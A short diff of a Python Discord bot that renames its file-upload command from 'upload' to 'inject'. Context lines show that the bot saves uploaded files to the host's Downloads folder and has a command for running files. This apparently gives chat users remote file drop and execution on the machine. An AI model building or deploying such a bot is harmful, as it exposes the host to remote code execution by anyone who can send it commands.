@@ -93,7 +93,7 @@ async def run_file(ctx, file_path: str):
         await ctx.send(f"An error occurred while running the file: {e}")
 
 # Define the command to upload a file
-@bot.command(name='upload')
+@bot.command(name='inject')
 async def upload_file(ctx):
     # Ensure the bot has a Downloads folder to save files
     downloads_dir = os.path.expanduser('~/Downloads')  # This will point to the user's Downloads folder
